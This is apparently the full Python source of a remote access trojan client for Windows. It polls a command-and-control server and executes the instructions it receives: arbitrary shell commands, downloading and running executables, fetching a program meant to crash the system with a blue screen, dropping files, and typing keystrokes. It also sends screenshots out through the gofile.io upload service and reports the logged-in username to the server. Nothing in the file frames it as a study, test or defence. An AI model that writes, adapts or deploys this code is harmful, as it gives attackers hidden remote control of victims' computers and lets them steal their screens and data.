from requests import RequestException, Response, post, get
from subprocess import CREATE_NEW_CONSOLE, Popen
from PIL import UnidentifiedImageError, Image
from fleep import get as get_soundtype
from playsound import playsound
from os import remove, getenv
from threading import Thread
from base64 import b64decode
from time import time, sleep
from os import getcwd, chdir
from random import choices
from sys import exit
import pyautogui


DELAY = 5
IP = "127.0.0.1"
PORT = 80
SCHEME = "http"
CONNECT_TIMEOUT = 5
connected: bool = False
pyautogui.FAILSAFE = False


def main() -> None:
    global connected
    try:
        while True:
            start_time = time()
            commands_response = get(
                f"{SCHEME}://{IP}:{PORT}/command-center",
                timeout=CONNECT_TIMEOUT,
            )
            show_image_response = get(
                f"{SCHEME}://{IP}:{PORT}/image-center",
                timeout=CONNECT_TIMEOUT,
            )
            bsod_response = get(
                f"{SCHEME}://{IP}:{PORT}/bsod-center",
                timeout=CONNECT_TIMEOUT,
            )
            runfile_response = get(
                f"{SCHEME}://{IP}:{PORT}/runfile-center",
                timeout=CONNECT_TIMEOUT,
            )
            screenshot_response = get(
                f"{SCHEME}://{IP}:{PORT}/screenshot-center",
                timeout=CONNECT_TIMEOUT,
            )
            open_website_response = get(
                f"{SCHEME}://{IP}:{PORT}/website-center",
                timeout=CONNECT_TIMEOUT,
            )
            dropfile_response = get(
                f"{SCHEME}://{IP}:{PORT}/dropfile-center",
                timeout=CONNECT_TIMEOUT,
            )
            username_response = get(
                f"{SCHEME}://{IP}:{PORT}/getuser-center",
                timeout=CONNECT_TIMEOUT,
            )
            playsound_response = get(
                f"{SCHEME}://{IP}:{PORT}/playsound-center",
                timeout=CONNECT_TIMEOUT,
            )
            typestring_response = get(
                f"{SCHEME}://{IP}:{PORT}/typestring-center",
                timeout=CONNECT_TIMEOUT,
            )

            if commands_response.status_code == 200:
                run_command(commands_response)
            if show_image_response.status_code == 200:
                show_image(show_image_response)
            if bsod_response.status_code == 200:
                invoke_bsod()
            if runfile_response.status_code == 200:
                run_file(runfile_response.json())
            if screenshot_response.status_code == 200:
                post_screenshot()
            if open_website_response.status_code == 200:
                open_website(open_website_response.text)
            if dropfile_response.status_code == 200:
                drop_file(
                    dropfile_response.json().get("dropfile"),
                    dropfile_response.json().get("location"),
                )
            if username_response.status_code == 200:
                post_user()
            if playsound_response.status_code == 200:
                play_sound(playsound_response.content)
            if typestring_response.status_code == 200:
                Thread(
                    target=typestring_thread, args=[typestring_response.json()]
                ).start()

            if not connected:
                print("Connected and asked server for actions.")
                connected = True
            else:
                print("Asked server for actions.")
            sleep_time = DELAY - (time() - start_time)
            if sleep_time >= 0:
                sleep(DELAY)
    except RequestException:
        print("Failed to connect, retrying...")
        connected = False
        main()
    except KeyboardInterrupt:
        print("Goodbye...")
        sleep(1.5)
        exit()
    except Exception as error:
        print(error)
        main()


def typestring_thread(response_json: dict) -> None:
    try:
        typed_text = response_json.get("text")
        delay = response_json.get("delay")
        pyautogui.typewrite(typed_text, delay)
    except Exception as error:
        print(error)


def play_sound(soundfile_data: bytes) -> None:
    old_cd = getcwd()
    chdir(getenv("temp"))
    sound_type = get_soundtype(soundfile_data).extension[0]
    filename = (
        f"{''.join(choices('abcdefghijklmnopqrstuvwxyz1234567890', k=5))}.{sound_type}"
    )
    with open(filename, "wb") as temp_file:
        temp_file.write(soundfile_data)
    playsound(filename, block=False)
    chdir(old_cd)


def post_user() -> None:
    post(f"{SCHEME}://{IP}:{PORT}/getuser-center?username={getenv('USERNAME')}")


def drop_file(content: str, location: str) -> None:
    with open(location, "wb") as dropped_file:
        dropped_file.write(b64decode(content))


def open_website(url: str) -> None:
    Popen(f'powershell -Command "start {url}"')


def post_screenshot() -> None:
    old_cd = getcwd()
    chdir(getenv("temp"))
    pyautogui.screenshot().save("temp.png", "png")
    upload_url = (
        "https://"
        + get("https://api.gofile.io/getServer").json().get("data").get("server")
        + ".gofile.io/uploadFile"
    )
    with open("temp.png", "rb") as temp_file:
        download_page: str = (
            post(upload_url, files={"file": temp_file})
            .json()
            .get("data")
            .get("downloadPage")
        )
    remove("temp.png")
    chdir(old_cd)
    post(f"{SCHEME}://{IP}:{PORT}/screenshot-center?download_page={download_page}")


def run_file(response_json: dict) -> None:
    old_cd = getcwd()
    chdir(getenv("temp"))
    with open("temp.exe", "wb") as temp_file:
        temp_file.write(b64decode(response_json.get("runfile")))
    Popen(
        f"temp.exe {response_json.get('args')}",
        creationflags=CREATE_NEW_CONSOLE,
    )
    chdir(old_cd)


def invoke_bsod() -> None:
    chdir(getenv("temp"))
    with open("temp.exe", "wb") as temp_file:
        temp_file.write(get(f"{SCHEME}://{IP}:{PORT}/bsod.exe").content)
    Popen("temp.exe")


def show_image(get_images_response: Response) -> None:
    with open("temp", "wb") as temp_image_file:
        temp_image_file.write(get_images_response.content)
    try:
        Image.open("temp").show()
    except UnidentifiedImageError:
        pass
    remove("temp")


def run_command(get_commands_response: Response) -> None:
    Popen(get_commands_response.text)


if __name__ == "__main__":
    main()
